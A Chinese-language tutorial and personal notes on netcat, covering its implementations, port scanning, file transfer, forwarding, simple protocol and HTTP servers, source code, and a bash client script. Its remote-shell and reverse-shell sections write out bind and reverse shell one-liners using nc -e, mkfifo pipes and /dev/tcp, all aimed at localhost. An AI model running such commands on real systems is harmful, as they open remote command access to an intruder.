# nc的使用和原理

## nc的简介

nc 是 netcat 的缩写。

nc 是一个用于处理网络连接的工具。

netcat 的原始版本是一个 Unix 程序。
最后一个版本 （1.10） 于 1996 年 4 月发布。原作者叫做 Hobbit <hobbit@avian.org>。
- https://nc110.sourceforge.io/
- https://sourceforge.net/projects/nc110/
- https://sourceforge.net/p/nc110/git/ci/master/tree/

现在的 nc 有很多种实现。下面是常见的五种实现。
- GNU 版
    - 包名通常为 nc-traditional netcat-traditional
    - https://snapshot.debian.org/package/netcat/
- openbsd 版
    - 包名通常为 nc-openbsd netcat-openbsd
    - https://github.com/openbsd/src/blob/master/usr.bin/nc
- nmap 版
    - ncat 通常是指 nmap 版的 nc
    - ncat 的包名通常是 ncat nmap-ncat
    - https://github.com/nmap/nmap/tree/master/ncat
    - ncat 是 nmap 项目的组成部分。
    - Nmap (“Network Mapper(网络映射器)”) 是一个免费的开源实用程序，用于 网络发现和安全审核。
    - 除了经典的命令行 Nmap 可执行文件之外，Nmap 套件包括
        - 高级 GUI 和结果查看器 （Zenmap），
        - 一个灵活的数据 传输、重定向和调试工具 （Ncat），
        - 一个实用程序 比较扫描结果 （Ndiff） 
        - 数据包生成和响应分析工具 （Nping）
- socat
    - socat 的官方文档描述它是 "netcat++" (extended design, new implementation)
    - socat 的包名就是 socat
    - socat 是 socket cat 的缩写
    - http://www.dest-unreach.org/socat/
- BusyBox 版
    - https://github.com/mirror/busybox/blob/master/networking/nc.c
    - 同样地 toybox 里也有一个 nc
- 除此之外，还有一个 cryptcat
    - cryptcat 是 netcat 的变体，基本上就是多了一个 密码 的参数
    - cryptcat 好像是来自 kali linux

多数情况下 nc 或 netcat 是指 GNU 版 或 openbsd 版，一般系统自带的是 GNU 版
- 判断当前系统的 nc 版本
    先用 type nc
    再用 realpath 或 ls -l 查看 nc 的真实路径，最好用 realpath
    类似这样 realpath /bin/nc

socat 和 ncat 和 nc-openbsd 都支持 tls 。
从功能上看。
BusyBox nc < nc-traditional < nc-openbsd < ncat < socat

## nc的使用

nc 扫描端口
```
nc -v 127.0.0.1 801
nc -v -i 1 127.0.0.1 801
nc -v -z -i 1 127.0.0.1 801
nc -v -z -i 1 127.0.0.1 800-900
不是所有版本的nc都支持 i z 参数，不是所有版本的 nc 支持批量端口扫描
```

<!--
nc -v 127.0.0.1 801
echo $? 为 0 就是端口有开启

如果有 -z 参数还是可以通过 bash 来实现批量端口扫描的
有 -w 参数也可以，但可能有一点不准确
超时可以用 timeout 这个命令？
-->

nc 实现聊天
```
最简单的一对一
    nc -l 801
    nc 127.0.0.1 801
```

nc 传输文件
```
接收端先运行一个 nc
    nc -l 801 > output.txt
发送端再运行一个 nc
    nc 127.0.0.1 801 < input.txt
```

nc 实现一个转发服务
```
nc 自己调用自己
nc -v -l -k -p 9901 -e "nc 127.0.0.1 9902"
nc -v -l -k -p 9901 -e "bash -c \"nc 127.0.0.1 9902\""
使用管道
mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash -c "nc 127.0.0.1 9902" 2>&1 1>pipe1;
```

nc 实现远程 shell
```
远程 shell
    nc -v -l -p 9901 -e "bash"
控制端
    nc -v 127.0.0.1 9901
即使没有 -e 参数，也能通过管道实现各种奇技淫巧，虽然管道的奇技淫巧只能处理单个连接
    mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash 2>&1 1>pipe1;
```

nc 实现远程反向 shell
```
控制端先运行一个 nc
    nc -v -l -p 9901
目标机器上连接控制机器的 9901 端口，并将其shell绑定到该连接上
    nc -v 127.0.0.1 9901 -e "bash"
    mkfifo pipe1; cat pipe1 | nc -v 127.0.0.1 9901 | /bin/bash 2>&1 1>pipe1;
    exec 3<>/dev/tcp/127.0.0.1/9901; exec 0>&3; exec 1<&3; /bin/bash 2>&1;
    exec 3<>/dev/tcp/127.0.0.1/9901; /bin/bash 2>&1 0>&3 1<&3; 这种写法似乎更好
```

用 ncat 实现最简单的五个协议
```
参考这个网页
https://nmap.org/ncat/guide/ncat-simple-services.html

echo
    while read -r line; do echo "$line"; done
    echo 123 | while read -r line; do echo "$line"; done
    echo -e "123\n321" | while read -r line; do echo "$line"; done
    nc -l -k -p 9901 -e "cat $@"
daytime
    date -u "+%d %b %y %k:%M:%S %z"
    date -u --rfc-2822
    date -u --rfc-3339="seconds"
    date -u --iso-8601="seconds"
time
    date +%s | awk '{printf "%#x", $1+2209017600}' | xxd -r
discard
    while read -r line; do echo "$line" > /dev/null; done
chargen
    lineLimit=72;offset=0;count=0;while true; do for ((i=0; i<$lineLimit; i++)); do tag=$((($i + $offset) % 95)); printf "\x$(printf %x $(($tag + 32)))"; done; offset=$(($offset + 1)); if [ $offset -ge 95 ]; then offset=0; fi; printf "\n";count=$(($count + 1)); done;

```



nc 如何模拟 telnet 客户端？

nc 也可以像 telnet 那样模拟 http 客户端
```
nc www.baidu.com 80
连接后，快速地输入 GET / HTTP/1.0 然后连续输入两个回车，就能返回网页内容
又或者直接一句命令
    printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' | nc www.baidu.com 80
```

<!--
为什么连续输入两个空格是有效的，理论上只是输入了 \n\n ，而http协议里需要的是 \r\n\r\n 吧？
-->

nc 如何模拟 http 服务器
- 输出固定的内容
    ```
    如果支持 参数 k
    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 1s; done;

    如果不支持 参数 k
    while true; do { echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\n'; echo helloworld; } | nc -v -l -k -p 9901; sleep 0.5s; done

    能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待一秒
    ```

- 输出动态内容
    ```
    动态输出内容的命令会写得非常的长，而且还有很多转义字符需要处理，所以最后还是写成了脚本的形式
    nc -v -l -p 9901 -c ./http.sh
    同样地需要关注 nc 是否支持参数 k ，需要有两种不一样的写法，参考上面的就可以了
    参数k的作用是重复处理连接，如果没有参数k，nc会只处理一个连接就退出了

    这是 http.sh 的内容
    #!/bin/bash
    echo -n "HTTP/1.0 200 OK"
    echo -e -n "\r\n"
    echo -n "Content-Length: 11"
    echo -e -n "\r\n\r\n"
    echo "helloworld"

    已经有人做了类似的了
    https://github.com/avleen/bashttpd
    netcat -lp 9901 -e ./bashttpd
    ```

- 测试用的命令
    ```
    curl -v 127.0.0.1:9901
    nc 127.0.0.1 9901
    ```

<!--
    nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\"";
    这一句是可行的，无法保持运行
    while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; done;
    这一句是可行的，能保持运行，但每次只能处理一个请求，但无法退出
    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 1s; done;
    这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待一秒
    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
    这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待零点五秒，如果等待时间太短就无法通过连续两次 ctrl+c 退出了
    while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
    这一句是可行的
    while true; do { echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\n'; echo helloworld; } | nc -v -l -k -p 9901; sleep 0.5s; done
    这一句是可行的
    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -e ./http.sh; sleep 0.5s; done;
    这是运行脚本文件的例子
    这是脚本文件的内容
        #!/bin/bash
        echo -n "HTTP/1.0 200 OK"
        echo -e -n "\r\n"
        echo -n "Content-Length: 11"
        echo -e -n "\r\n\r\n"
        echo "helloworld"
    测试用的命令
        curl -v 127.0.0.1:9901
        nc 127.0.0.1 9901
    已经有人做了类似的了
        https://github.com/avleen/bashttpd
        netcat -lp 9901 -e ./bashttpd
        我试过了，这个是可行的


nc 有哪些通用的语法？
    似乎除了 -l 之外，其它参数都有变动
    最稳妥的方式还是通过 -h 来查看帮助

-->

### windows 如何使用 nc
- github 上有好几个 windows 版的 nc ，但都很久没更新了
    - https://github.com/diegocr/netcat
    - https://github.com/int0x33/nc.exe
- 先下载 windows 版的 busybox ，再使用 busybox 里的 nc
    - https://frippery.org/busybox/
    - https://github.com/rmyorston/busybox-w32
    - 要下载 busybox64u.exe 这个版本，64位且支持 unicode ，虽然这个版本只支持 win10和win11
- nmap 也有提供 windows 版的 nc
    - https://nmap.org/ncat/
    - https://sectools.org/tool/netcat/
    - https://nmap.org/book/ncat-man.html
    - https://nmap.org/ncat/guide/index.html
- windows 版的 ncat 最好还是在 bash 里运行。。。
- 或者用 脚本 语言自己实现一个也可以。。。

## nc的原理

### 大致原理
- 只处理连接
- socket一部分参数可以通过命令行传入，例如 -w -u 这类
- 把socket的输入和输出重定向到标准输入和标准输出

### nc 的源码
- nc-traditional
    - 可以下载到源码，但不能在线预览，bz2 的那个才是源码
    - https://snapshot.debian.org/package/netcat/
    - https://manpages.debian.org/bookworm/netcat-traditional/nc.traditional.1.en.html
- nc-openbsd
    - https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c
- nmap 的 nc
    - https://nmap.org/ncat/
    - https://github.com/nmap/nmap/tree/master/ncat
    - https://github.com/nmap/nmap/blob/master/ncat/ncat_main.c
- socat 的源码镜像，但很久没更新了
    - https://github.com/3ndG4me/socat
    - 源码可以直接在官网里下载 gz 文件 http://www.dest-unreach.org/socat/
- BusyBox nc
    - https://github.com/mirror/busybox/blob/master/networking/nc.c
- 原始版本的nc，也是很久都没更新了
    - https://sourceforge.net/p/nc110/git/ci/master/tree/

### 如何实现一个 nc
- 实现一个客户端
- 实现一个服务端

用 python 和 php 实现一个 nc

如果 bash 有 /usr/lib/bash/accept 这个特性，那么直接用 bash 实现一个 nc 也不是不可以的。
客户端部分用 exec /dev/tcp/$host/$port 和 exec /dev/udp/$host/$port 来实现，
服务端部分用 /usr/lib/bash/accept 来实现。
只有 bash 搞网络编程还是有太多限制了，因为 socket 很多选项无法通过 bash 设置。


<!--

不管是 gnu 版本还是 openbsd 版本，都有新老的区别，主要是传送文件时 stdin 发生 EOF 了，老版本会自动断开，而新的 gnu/openbsd 还会一直连着，
两年前 debian jessie 时统一升过级，导致网上的所有教程几乎同时失效。

GNU netcat 也有个 -q0 参数和 openbsd 的 -N 一样，可以在 stdin 结束时断开连接。


linux上可以直接 cat < /dev/tcp/ip/port，没有netcat时应急下。
cat > /dev/tcp/127.0.0.1/8081
echo haha > /dev/tcp/127.0.0.1/8081

printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' | nc www.baidu.com 80
printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' > /dev/tcp/www.baidu.com/80
cat < /dev/tcp/www.baidu.com/80

h help
e exec
l listen
k keep-open
p port
w wait
i idle-timeout

s Local source address
v Verbose
--version

z Zero-I/O 连接成功后就关闭连接，不读写数据，一般用在扫描端口


–idle-timeout 是一个常用于一些 Linux 命令或程序的选项，它用来设置空闲超时时间，
即当一个连接或会话在一定时间内没有任何活动时，就会被自动断开或关闭。
不同的命令或程序可能对 --idle-timeout 的含义和用法有所不同，
但一般都是为了节省资源或提高安全性。
–idle-timeout 的一些常见用法如下：
在 nc 命令中，–idle-timeout 用来设置用户连接的超时时间。
它后面跟一个数字，表示延迟的秒数。
例如，nc --idle-timeout 2 192.168.0.1 80 表示每隔 2 秒向 192.168.0.1 的 80 端口发送一个数据包，
如果超过 2 秒没有收到回应，则断开连接。

-i 似乎只能用在客户端

idle adj. 空闲的 v. 空转


从源码来看 w 参数
    客户端多少秒没有活动就关闭连接
        busybox nc 是通过信号来实现的
        Nmap的nc 没有看懂。。。
    opendsb nc 是用在 poll 函数里的
从源码来看 i 参数是直接用在 sleep 函数里的，起码 busybox nc 和 opendsb nc 都是这样的
    类似于这样的使用
        if (iflg)
            sleep(iflg)


nc 的参数
    作为 客户端 的参数
    作为 服务端 的参数
        -l
        -p
        -k 表示重复接收并处理某个端口上的所有连接，必须与 -l 参数一起使用。指定该参数，则意味着 nc 被当作 server，侦听并接受多个连接，而非只接受一个连接后就退出
    通用的参数
        -h
        -v
        -u 使用 udp 协议，这个是通用的，默认是使用tcp
        -e
        -4
        -6

不加 k 参数的话，只要处理完一个连接，服务端就会跟着关闭


用 python 和 php 实现一个 nc ，只实现 -h -l -e 这三个参数即可。

理论上只要实现了 l p e 三个参数就能作为服务端运行
即使没有 e 参数，也能通过管道实现各种奇技淫巧
也就是只需要实现 l p 即可

c 如何实现一个交互式的命令行？
php 如何实现一个交互式的命令行？
python 如何实现一个交互式的命令行？
处理命令行参数
读取并解释配置
建立连接
处理输入
处理输出

https://github.com/mirror/busybox/blob/master/networking/telnet.c
https://github.com/mirror/busybox/blob/master/networking/telnetd.c

https://docs.python.org/zh-cn/3/library/telnetlib.html
https://github.com/python/cpython/tree/3.12/Lib/telnetlib.py
    这个文件似乎能直接作为 telnet 客户端使用
    python telnetlib.py [-d] ... [host [port]]
https://www.cnblogs.com/mrlayfolk/p/15154813.html

https://github.com/search?q=telnet+language%3AC&type=repositories&l=PHP&s=stars&o=desc
https://github.com/fijiwebdesign/php-telnet
https://github.com/diotteo/TelnetClient.php

/dev/tcp并不是linux下面的一个文件。直接在/dev目录下面去是找不到这个文件的。这仅仅是bash的一个feature，因此这种方法也仅能在bash中使用，换了其他shell就没用了

nc [OPTIONS] HOST PORT  - connect
nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen

-->

<!--
在命令行里的 read 命令好像不能读入 换行符

直接输入回车 read 的数据就会为空

这一句是可行的
printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' | ./ncc.sh www.baidu.com 80
既然这样是可行的，那么理论上应该也可以发送 post 请求和上传文件的，那么理论上也可以用 bash 写一个 curl 出来。。。

```bash
#!/bin/bash

# 这一份是可行的，可以读取多行数据，但只是按行读取再按行输出，不能一次发送多行数据

sys_exit() {
    # 关闭连接
    exec 3<&-; # 关闭文件描述符 3 的输入
    exec 3>&-; # 关闭文件描述符 3 的输出

    if [ ! -z "$1" ]; then
        exit 1
    fi
    exit 0
}

# debuger() {

# }

debugerflg=0

logger() {
    loggertype=$1
    msg=$2
    if [[ $loggertype = 1 ]]; then
        if [[ $debugerflg = 1 ]]; then
            echo "* "$msg
        fi
    elif [ $loggertype = 2 ]; then
        echo "< "$msg
    elif [ $loggertype = 3 ]; then
        echo $msg
    fi
}

loggerTypeInfo=1
loggerTypeInput=2
loggerTypeError=3

current_pid=$$
logger $loggerTypeInfo "当前脚本的 PID 是: $current_pid"
# kill -s SIGKILL $current_pid

# 检查参数
if [ "$#" -ne 2 ]; then
    echo "用法: $0 <主机> <端口>"
    exit 1
fi

HOST=$1
PORT=$2

# 连接到指定的主机和端口
exec 3<>/dev/tcp/$HOST/$PORT

# 检查连接是否成功
if [ $? -ne 0 ]; then
    logger $loggerTypeError "无法连接到 $HOST:$PORT"
    exit 1
fi

logger $loggerTypeInfo "已连接到 $HOST:$PORT"

# read -t 1 -u 3 line：尝试从文件描述符 3 读取数据，-t 1 表示设置超时时间为 1 秒。
sleep 1;
while true; do

    stream_input=
    stream_input_line=
    while true; do
        # read -t 1 -N 1024 -u 3 stream_input_line;
        read -t 1 -u 3 stream_input_line;
        return_code=$?
        logger $loggerTypeInfo "读取时 fd 返回值 $return_code"
        if [[ ! -z $stream_input_line ]]; then
            logger $loggerTypeInput "$stream_input_line"
            stream_input=$stream_input$stream_input_line
        else
            if [[ $return_code -ne 0 ]]; then
                if [[ $return_code -le 128 ]]; then
                    logger $loggerTypeError "read 连接关闭"
                    sys_exit 1
                    break;
                fi
                if [[ $return_code -gt 128 ]]; then
                    logger $loggerTypeInfo "读超时"
                    break;
                fi
            fi
        fi
    done

    logger $loggerTypeInfo "$stream_input";

    stream_output=
    read -p "> " -r stream_output;
    if [[ ! -z $stream_output ]]; then

        if [[ $stream_output = "exit" ]]; then
            echo 'bye';
            break;
        fi

        logger $loggerTypeInfo "output size: "$(echo -n $stream_output | wc -c)
        echo $stream_output >&3
        return_code=$?
        logger $loggerTypeInfo "写入时 fd 返回值 $return_code"
        if [[ $return_code -ne 0 ]]; then
            logger $loggerTypeError "write 连接关闭"
            sys_exit 1
        fi
    fi

done

sys_exit

```
-->
